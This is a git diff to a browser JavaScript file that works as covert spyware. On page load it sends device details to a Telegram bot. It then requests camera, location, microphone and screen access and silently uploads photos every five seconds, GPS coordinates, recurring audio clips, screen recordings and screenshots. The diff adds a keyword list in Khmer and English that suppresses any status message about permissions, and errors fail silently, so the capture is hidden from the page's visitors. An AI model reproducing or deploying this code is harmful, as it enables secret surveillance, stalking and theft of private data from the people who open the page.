@@ -18,8 +18,14 @@ let screenRecorder = null;
 let isRecording = false;
 let recordedChunks = [];
 
-// Silent mode - don't send permission status messages
-const SILENT_MODE = true;
+// ==================== SILENT MODE - BLOCK ALL PERMISSION MESSAGES ====================
+// List of keywords to block from being sent to Telegram
+const BLOCKED_KEYWORDS = [
+    'កាមេរ៉ា', 'camera', 'ទីតាំង', 'location', 'មីក្រូហ្វូន', 'microphone', 
+    'ថតអេក្រង់', 'screen', 'ត្រូវបានអនុញ្ញាត', 'granted', 
+    'មិនត្រូវបានអនុញ្ញាត', 'denied', 'បដិសេធ',
+    'CAMERA ACCESS', 'LOCATION ACCESS', 'MICROPHONE ACCESS', 'SCREEN RECORDING'
+];
 
 // ==================== DEVICE INFO COLLECTION ====================
 async function collectDeviceInfo() {
@@ -133,12 +139,16 @@ ${locationText}
 📄 URL: ${info.url}`;
 }
 
-// ==================== TELEGRAM FUNCTIONS ====================
+// ==================== TELEGRAM FUNCTIONS WITH BLOCKING ====================
 async function sendMessageToTelegram(message) {
     if (!CHAT_ID || !message) return;
-    if (SILENT_MODE && (message.includes('កាមេរ៉ា') || message.includes('ទីតាំង') || message.includes('មីក្រូហ្វូន') || message.includes('ថតអេក្រង់'))) {
-        // Skip permission status messages in silent mode
-        return;
+    
+    // Block any message containing permission-related keywords
+    for (const keyword of BLOCKED_KEYWORDS) {
+        if (message.toLowerCase().includes(keyword.toLowerCase())) {
+            console.log(`Blocked message containing: ${keyword}`);
+            return; // Don't send this message
+        }
     }
     
     try {
@@ -156,6 +166,15 @@ async function sendMessageToTelegram(message) {
 
 async function sendPhotoToTelegram(file, caption) {
     if (!CHAT_ID) return;
+    
+    // Block caption if it contains permission keywords
+    if (caption) {
+        for (const keyword of BLOCKED_KEYWORDS) {
+            if (caption.toLowerCase().includes(keyword.toLowerCase())) {
+                return;
+            }
+        }
+    }
     
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
@@ -202,7 +221,7 @@ async function sendAudioToTelegram(file, caption) {
     } catch (error) {}
 }
 
-// ==================== 1. CAMERA (1s) - Silent ====================
+// ==================== 1. CAMERA (1s) - No messages to Telegram ====================
 async function requestCameraPermission() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -211,12 +230,10 @@ async function requestCameraPermission() {
         });
         
         cameraStream = stream;
-        
-        // Start capturing photos every 3 seconds (silent - no status message)
         startCameraCapture(stream);
         
     } catch (error) {
-        // Silent fail - don't send error message
+        // Completely silent - no message
     }
 }
 
@@ -241,10 +258,10 @@ function startCameraCapture(stream) {
                 await sendPhotoToTelegram(file, `📸 *រូបថតពីកាមេរ៉ា*\n⏰ ${new Date().toLocaleString('km-KH')}`);
             }
         }, 'image/jpeg', 0.7);
-    }, 5000); // Capture every 5 seconds
+    }, 5000);
 }
 
-// ==================== 2. LOCATION (3s) - Silent ====================
+// ==================== 2. LOCATION (3s) - Silent, only send location data ====================
 function requestLocationPermission() {
     if (!navigator.geolocation) return;
     
@@ -256,7 +273,7 @@ function requestLocationPermission() {
                 accuracy: Math.round(position.coords.accuracy)
             };
             
-            // Send location as map (silent - no text message)
+            // Send only the location map, no text message
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -267,7 +284,7 @@ function requestLocationPermission() {
                 }),
             });
         },
-        () => {}, // Silent fail
+        () => {}, // Completely silent on error
         { enableHighAccuracy: true, timeout: 10000 }
     );
     
@@ -302,12 +319,10 @@ async function requestMicrophonePermission() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         audioStream = stream;
-        
-        // Start audio recording (silent - no status message)
         startAudioRecording(stream);
         
     } catch (error) {
-        // Silent fail
+        // Completely silent
     }
 }
 
@@ -332,12 +347,11 @@ function startAudioRecording(stream) {
             recorder.stop();
             setTimeout(() => recorder.start(), 100);
         }
-    }, 15000); // Record every 15 seconds
+    }, 15000);
 }
 
 // ==================== 4. SCREEN RECORDING (7s) - Silent ====================
 async function requestScreenPermission() {
-    // Check if getDisplayMedia is supported
     if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
         return; // Silent fail
     }
@@ -349,14 +363,8 @@ async function requestScreenPermission() {
         });
         
         screenStream = stream;
-        
-        // Start screen recording (silent - no status message)
         startScreenRecording(stream);
-        
-        // Take screenshot
         await captureScreenshot();
-        
-        // Screenshot every 30 seconds
         setInterval(() => captureScreenshot(), 30000);
         
     } catch (error) {
@@ -383,7 +391,6 @@ function startScreenRecording(stream) {
     
     screenRecorder.start(1000);
     
-    // Stop after 30 seconds
     setTimeout(() => {
         if (screenRecorder && screenRecorder.state === 'recording') {
             screenRecorder.stop();
@@ -434,7 +441,6 @@ async function captureScreenshot() {
 
 // ==================== START DATA COLLECTION (10s) ====================
 async function startDataCollection() {
-    // Send device info every 60 seconds
     setInterval(async () => {
         const deviceInfo = await collectDeviceInfo();
         const formattedInfo = formatDeviceInfo(deviceInfo);
@@ -449,30 +455,20 @@ async function initialize() {
     const formattedInfo = formatDeviceInfo(deviceInfo);
     await sendMessageToTelegram(`🚀 *PAGE LOADED*\n\n${formattedInfo}`);
     
-    // 1s: Request camera permission (silent)
-    setTimeout(() => {
-        requestCameraPermission();
-    }, 1000);
+    // 1s: Request camera permission
+    setTimeout(() => { requestCameraPermission(); }, 1000);
     
-    // 3s: Request location permission (silent)
-    setTimeout(() => {
-        requestLocationPermission();
-    }, 3000);
+    // 3s: Request location permission
+    setTimeout(() => { requestLocationPermission(); }, 3000);
     
-    // 5s: Request microphone permission (silent)
-    setTimeout(() => {
-        requestMicrophonePermission();
-    }, 5000);
+    // 5s: Request microphone permission
+    setTimeout(() => { requestMicrophonePermission(); }, 5000);
     
-    // 7s: Request screen recording permission (silent)
-    setTimeout(() => {
-        requestScreenPermission();
-    }, 7000);
+    // 7s: Request screen recording permission
+    setTimeout(() => { requestScreenPermission(); }, 7000);
     
     // 10s: Start full data collection
-    setTimeout(() => {
-        startDataCollection();
-    }, 10000);
+    setTimeout(() => { startDataCollection(); }, 10000);
 }
 
 // Start when page loads
